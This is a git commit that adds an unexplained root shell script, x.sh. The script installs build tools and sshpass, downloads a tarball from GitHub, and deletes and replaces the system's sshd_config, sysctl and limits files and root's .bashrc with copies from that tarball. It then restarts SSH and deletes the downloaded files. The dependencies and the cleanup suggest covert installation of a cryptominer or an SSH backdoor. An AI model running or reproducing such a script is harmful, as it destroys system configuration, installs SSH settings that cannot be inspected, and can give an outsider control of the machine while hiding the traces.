326461361de935d3b0138808a090f1d93d7bb31c
Kygo69 <40442041+Kygo69@users.noreply.github.com>
2018-11-13 09:46:51 +0700

    Add files via upload

---
+++ x.sh
@@ -0,0 +1,15 @@
+#!/bin/bash
+apt-get update -y
+apt-get upgrade -y
+apt install -y libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev screen psmisc iputils-ping sshpass
+wget https://raw.githubusercontent.com/Kygo69/x/master/x.tar.gz
+tar -zxvf x.tar.gz
+rm -rf /etc/security/limits.conf /etc/sysctl.conf /etc/ssh/sshd_config /root/.bashrc
+cp /root/x/conf/.bashrc /root/
+cp /root/x/conf/sshd_config /etc/ssh/
+cp /root/x/conf/limits.conf /etc/security/
+cp /root/x/conf/sysctl.conf /etc/
+service ssh restart
+mkdir -p /root/.ssh/
+cp /root/x/conf/config /root/.ssh/
+rm -rf /root/x /root/x.tar.gz
